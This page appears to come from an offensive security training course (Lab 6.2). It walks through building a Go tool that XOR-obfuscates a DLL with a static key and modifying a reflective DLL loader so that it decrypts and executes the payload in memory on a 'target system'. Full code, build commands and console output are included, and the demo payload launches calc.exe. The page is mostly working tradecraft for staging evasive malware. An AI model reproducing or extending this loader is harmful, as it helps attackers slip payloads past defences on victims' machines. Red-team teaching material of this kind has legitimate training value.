---
showTableOfContents: true
title: "Obfuscated Loading (Lab 6.2)"
type: "page"
---
## Goal
Let's now integrate the simple XOR obfuscation logic into our reflective loader. We'll create a tool to obfuscate our DLL and then modify our reflective loader to handle this obfuscated payload.

We'll thus modify both our DLL (from Lab 1.1) and final Reflective Loader (from Lab 5.2).

## Part 1 - Creating our Obfuscator
### Code
- Create a new file called something like `obfuscator.go` in the same directory as `calc_dll.dll`
- Again, feel free to modify this key, but don't get too hung-up on it - we'll completely move ahead from using a static key in our next module.


    ```Go
    package main
    
    import (
    	"fmt"
    	"log"
    	"os"
    )
    
    // --- Include the xorEncryptDecrypt function from Lab 6.1 ---
    // xorEncryptDecrypt performs XOR operation between data and key.
    // The key is repeated cyclically if it's shorter than the data.
    func xorEncryptDecrypt(data []byte, key []byte) []byte {
    	if len(data) == 0 { return []byte{} }
    	if len(key) == 0 {
    		log.Println("[!] Warning: XOR key is empty. Returning original data.")
    		result := make([]byte, len(data)); copy(result, data); return result
    	}
    	result := make([]byte, len(data)); keyLen := len(key)
    	for i := 0; i < len(data); i++ {
    		result[i] = data[i] ^ key[i%keyLen]
    	}
    	return result
    }
    
    
    func main() {
    	fmt.Println("[+] DLL Obfuscator Tool")
    
    	// --- Configuration ---
    	inputDllPath := "calc_dll.dll"      // Original DLL
    	outputFilePath := "calc_dll.xor"    // Obfuscated output file
    	// IMPORTANT: Use the same key in the loader!
    	xorKey := []byte{0x55, 0xAA, 0x55, 0xAA, 0x11, 0x22, 0x33, 0x44} // Example 8-byte key
    
    	fmt.Printf("[+] Input DLL: %s\n", inputDllPath)
    	fmt.Printf("[+] Output File: %s\n", outputFilePath)
    	fmt.Printf("[+] XOR Key (Hex): %X\n", xorKey)
    
    	// --- Read Input DLL ---
    	fmt.Printf("[+] Reading input DLL...\n")
    	plaintextBytes, err := os.ReadFile(inputDllPath)
    	if err != nil {
    		log.Fatalf("[-] Failed to read input file '%s': %v\n", inputDllPath, err)
    	}
    	fmt.Printf("[+] Read %d bytes from input DLL.\n", len(plaintextBytes))
    
    	// --- Obfuscate ---
    	fmt.Println("[+] Obfuscating DLL bytes using XOR...")
    	obfuscatedBytes := xorEncryptDecrypt(plaintextBytes, xorKey)
    	fmt.Println("[+] Obfuscation complete.")
    
    	// --- Write Output File ---
    	fmt.Printf("[+] Writing %d obfuscated bytes to '%s'...\n", len(obfuscatedBytes), outputFilePath)
    	err = os.WriteFile(outputFilePath, obfuscatedBytes, 0644) // Standard file permissions
    	if err != nil {
    		log.Fatalf("[-] Failed to write output file '%s': %v\n", outputFilePath, err)
    	}
    	fmt.Println("[+] Output file written successfully.")
    	fmt.Println("[+] Obfuscator finished.")
    }
    
    ```



### Instructions
- Go ahead and run obfuscator.go in the same directory as calc_dll.dll

```
go run ./obfuscator.go
```


### Results

```
❯ go run ./obfuscator.go
[+] DLL Obfuscator Tool
[+] Input DLL: calc_dll.dll
[+] Output File: calc_dll.xor
[+] XOR Key (Hex): 55AA55AA11223344
[+] Reading input DLL...
[+] Read 111493 bytes from input DLL.
[+] Obfuscating DLL bytes using XOR...
[+] Obfuscation complete.
[+] Writing 111493 obfuscated bytes to 'calc_dll.xor'...
[+] Output file written successfully.
[+] Obfuscator finished.

```


### Discussion
Our output indicates our operations was a success, and indeed we can confirm we now have calc_dll.xor in the same directory. Let's  see if we can still get our reflective loader to launch `calc.exe` after we furnish it with the ability to decrypt.



## Part 2 - Reflective Loader Modification
### Code
- Open your reflective loader Go file from Lab 5.2
- Copy the **exact same** `xorEncryptDecrypt` function from Lab 6.1 (or the obfuscator tool) into this loader file.

- We'll now make a few modifications inside of our main() function
- First add the exact same key right at the top. If the keys differ this won't work.
```go
xorKey := []byte{0x55, 0xAA, 0x55, 0xAA, 0x11, 0x22, 0x33, 0x44} 
fmt.Printf("[+] Using XOR Key (Hex): %X\n", xorKey)
```

- Also if you wanted to change your usage instructions (see below), you can of course do so.
- This won't affect the application, but it is obvs important that you now point to the .xor file NOT the .dll file
```go
log.Fatalf("[-] Usage: %s <path_to_dll>\n", os.Args[0])
```


- We've added the function to decrypt our payload, but now of course we have to actually use it.
- See the comment below indicating where we want to place this step, it has to happen immediately _after_ reading the file content into `dllBytes`.

```go
	dllBytes, err := os.ReadFile(dllPath)
	if err != nil {
		log.Fatalf("[-] Failed to read file '%s': %v\n", dllPath, err)
	}
	
	// ADD DECRYPTION STEP HERE
	
	reader := bytes.NewReader(dllBytes)
```


- So add this code there
```go
    // --- *** ADD DECRYPTION STEP HERE *** ---
    fmt.Println("[+] Decrypting file content using XOR key...")
    dllBytes = xorEncryptDecrypt(dllBytes, xorKey) // Decrypt into dllBytes
    fmt.Printf("[+] Decryption complete. Resulting size: %d bytes.\n", len(dllBytes))
    // --- *** END DECRYPTION STEP *** ---
```

- You can see we are updating the value of the variable `dllBytes` with its result after being decrypted.


Since I've essentially explained each change here, I'm not going to include a "Code Breakdown" section.


## Instructions

- Compile the new application.

```shell
GOOS=windows GOARCH=amd64 go build  
```

- Then copy it over to target system and invoke from command-line, providing as argument now the `.xor` we'd like to decrypt + run,

```bash
".\reflect_xor.exe .\calc_dll.xor"  
```



## Results

```
PS C:\Users\vuilhond\Desktop> .\reflect_XOR.exe .\calc_dll.xor
[+] Starting Manual DLL Mapper (with IAT Resolution)...
[+] Using XOR Key (Hex): 55AA55AA11223344
[+] Reading file: .\calc_dll.xor
[+] Decrypting file content using XOR key...
[+] Decryption complete. Resulting size: 111493 bytes.

// REST OF RESULTS SAME AS BEFORE
```


## Discussion

We can see we were able to decrypt our payload, and `calc.exe` should once again pop up.

![calc.exe](../img/calc.png)

The fact that we could once again get `calc.exe` to launch confirms that our loader successfully read the obfuscated file, decrypted it using the correct key, and then reflectively loaded and executed the resulting DLL payload just as it did in Lab 5.2, but this time starting from an obfuscated file.

## Conclusion

This lab completes our integration of a  a simple obfuscation layer. In our next module we're going to layer in a number of methods to improve the security of our decryption layer - let's go!




---
[|TOC|]({{< ref "../moc.md" >}})
[|PREV|]({{< ref "xor_lab.md" >}})
[|NEXT|]({{< ref "../module07/rolling.md" >}})